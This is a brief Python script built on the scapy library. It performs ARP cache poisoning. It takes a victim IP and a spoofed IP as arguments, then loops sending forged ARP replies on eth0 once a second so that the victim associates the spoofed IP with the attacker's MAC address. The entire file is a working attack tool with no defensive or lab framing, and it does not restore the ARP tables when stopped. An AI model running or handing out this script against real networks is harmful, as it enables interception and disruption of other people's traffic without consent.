from scapy.all import *
import sys
import time

victim_ip = sys.argv[1]
fake_ip = sys.argv[2]

victim_mac = getmacbyip(victim_ip)
print(f"Victim MAC: {victim_mac}")

try:
    while True:
        pkt = (Ether(dst=victim_mac) /
                ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip))
        sendp(pkt, iface="eth0", verbose=False)
        print(f"Poisoning: {victim_ip} thinks {fake_ip} is at our MAC")
        time.sleep(1)

except KeyboardInterrupt:
    print("Stopped")